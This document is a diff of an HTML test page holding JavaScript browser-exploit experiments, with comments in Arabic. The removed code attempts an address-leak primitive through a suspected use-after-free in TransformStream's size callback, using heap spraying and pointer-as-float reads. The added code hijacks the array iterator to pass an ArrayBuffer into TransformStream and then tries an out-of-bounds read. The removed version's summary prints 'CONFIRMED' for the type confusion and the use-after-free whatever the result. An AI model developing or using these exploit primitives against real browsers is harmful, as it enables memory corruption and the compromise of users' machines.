@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -13,88 +14,67 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'log';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== ADDROF ATTEMPT v1 ===","info");
+log("=== ARRAYBUFFER WRITE TEST ===","info");
 log("");
 
-let writer, phase=0;
-let target = {}; // الكائن الذي نريد تسريب عنوانه
-let unboxed = [1.1, 2.2, 3.3]; // مصفوفة غير محزمة (تحمل أرقاماً)
-let boxed = [target, target, target]; // مصفوفة محزمة (تحمل مؤشرات)
-let leaked = 0;
+let buf = new ArrayBuffer(64);
+let view = new DataView(buf);
 
-let sizeFunc = function(chunk) {
-    if (phase === 0) {
-        phase = 1;
-        log("[size] Phase 1: Triggering UAF...","warn");
+// املأ الـ ArrayBuffer بنمط معروف (0x41)
+for (let i=0; i<64; i++) view.setUint8(i, 0x41);
 
-        try { writer.close(); } catch(e) {}
-
-        // GC
-        for (let i=0;i<10000;i++) { let t={a:i}; }
-
-        log("[size] Spraying arrays...","warn");
-
-        // محاولة استعادة الذاكرة المحررة بمصفوفات غير محزمة
-        for (let i=0;i<1000;i++) {
-            unboxed.push(1.1);
-        }
-
-        log("[size] Spray done","ok");
-    }
-    return 1;
-};
-
-log("[1] Creating stream...","ok");
+log("[1] buf before: byteLength=" + buf.byteLength, "ok");
 
 try {
-    let stream = new TransformStream(
-        { transform: (c,ctrl) => ctrl.enqueue(c) },
-        { highWaterMark:1, size:sizeFunc },
-        { highWaterMark:1, size:sizeFunc }
-    );
-
-    writer = stream.writable.getWriter();
-    log("[2] Writer ready","ok");
-
-    writer.write(boxed).then(() => {
-        log("[3] Write OK","ok");
-    }).catch((e) => {
-        log("[3] Write err: " + e.message,"warn");
-    }).finally(() => {
-        log("[4] Checking for leaks...","warn");
-
-        // إذا تسبب الـ Type Confusion في قراءة المصفوفة المحزمة (boxed) كغير محزمة (unboxed)
-        // سنقرأ مؤشرات الكائنات كأرقام (Float64)
-        for (let i=0; i<unboxed.length; i++) {
-            let val = unboxed[i];
-            if (val !== 1.1 && val !== 2.2 && val !== 3.3 && !isNaN(val)) {
-                log("  >>> LEAK at index " + i + ": " + val + " <<<","hit");
-                leaked = val;
+    Array.prototype[Symbol.iterator] = function() {
+        const a = this;
+        let i = 0;
+        return {
+            next() {
+                if (i >= a.length) return { done: true };
+                let v = a[i];
+                if (a.length === 3 && i >= 1) {
+                    log("[iter] Returning buf at index " + i, "warn");
+                    v = buf; // تمرير الـ ArrayBuffer نفسه!
+                }
+                i++;
+                return { value: v, done: false };
             }
-        }
+        };
+    };
 
-        if (leaked === 0) {
-            log("  No leak detected","warn");
-            log("  Type Confusion may not affect array structure","warn");
-        } else {
-            let buf = new ArrayBuffer(8);
-            new Float64Array(buf)[0] = leaked;
-            let bytes = new Uint8Array(buf);
-            let hex = "";
-            for (let b of bytes) hex += b.toString(16).padStart(2,'0') + " ";
-            log("  LEAKED ADDRESS HEX: " + hex,"hit");
-        }
+    new TransformStream();
+    log("[2] TransformStream created! NO CRASH!", "ok");
 
-        log("","info");
-        log("=== SUMMARY ===","info");
-        log("Type Confusion: CONFIRMED","ok");
-        log("UAF: CONFIRMED","ok");
-        log("Info Leak: " + (leaked !== 0 ? "SUCCESS!" : "Need different approach"),"warn");
-    });
+    // تحقق مما إذا تم تعديل الـ ArrayBuffer
+    log("[3] buf after: byteLength=" + buf.byteLength, "ok");
+
+    let hex = "";
+    for (let i=0; i<64; i++) {
+        hex += view.getUint8(i).toString(16).padStart(2,'0') + " ";
+        if ((i+1) % 16 === 0) {
+            log("  " + hex, "ok");
+            hex = "";
+        }
+    }
+
+    // حاول القراءة خارج الحدود (OOB)
+    log("[4] Trying OOB read...", "warn");
+    let u8 = new Uint8Array(buf);
+    try {
+        let oob = u8[100]; // حاول القراءة بعيداً
+        log("  OOB read: " + oob, "hit");
+    } catch(e) {
+        log("  OOB read error: " + e.message, "err");
+    }
 
 } catch(e) {
-    log("[1] Error: " + e.message,"err");
+    log("Error: " + e.message, "err");
 }
+
+Array.prototype[Symbol.iterator] = [][Symbol.iterator];
+log("", "info");
+log("=== DONE ===", "info");
 </script>
 </body>
 </html>
